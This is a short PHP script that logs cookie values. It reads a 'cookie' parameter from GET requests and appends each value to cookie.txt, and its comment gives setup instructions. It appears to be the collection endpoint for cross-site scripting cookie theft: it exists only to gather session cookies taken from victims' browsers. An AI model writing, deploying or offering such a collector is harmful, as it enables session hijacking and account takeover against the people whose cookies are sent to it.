<?php

/* This script will save the cookie in a file called cookie.txt if the cookie parameter is set.
   if the file already has content in it, it will append the cookie to the end of the file. 

   Note: you need to manually create a cookie.txt file in the same dir as this php file!
*/
if (isset($_GET["cookie"])) {
  $cookie = $_GET["cookie"];
  file_put_contents("cookie.txt", $cookie."\n", FILE_APPEND);
}

?>
